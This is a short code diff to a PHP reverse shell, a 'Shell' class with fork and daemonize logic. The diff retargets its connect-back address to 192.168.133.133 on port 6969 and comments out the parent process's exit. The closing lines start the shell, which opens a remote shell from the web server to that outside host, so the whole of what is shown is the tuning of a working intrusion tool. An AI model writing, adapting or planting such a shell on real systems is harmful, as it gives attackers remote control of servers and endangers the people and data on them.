@@ -37,7 +37,7 @@ class Shell {
         } else if (($pid = @pcntl_fork()) < 0) {
             echo "DAEMONIZE: Cannot fork off the parent process, moving on...\n";
         } else if ($pid > 0) {
-            $exit = true;
+            // $exit = true;
             echo "DAEMONIZE: Child process forked off successfully, parent process will now exit...\n";
         } else if (posix_setsid() < 0) {
             echo "DAEMONIZE: Forked off the parent process but cannot set a new SID, moving on as an orphan...\n";
@@ -157,7 +157,7 @@ class Shell {
     }
 }
 echo '<pre>';
-$sh = new Shell('192.168.133.129', 6969);
+$sh = new Shell('192.168.133.133', 6969);
 $sh->run();
 unset($sh);
 echo '</pre>';
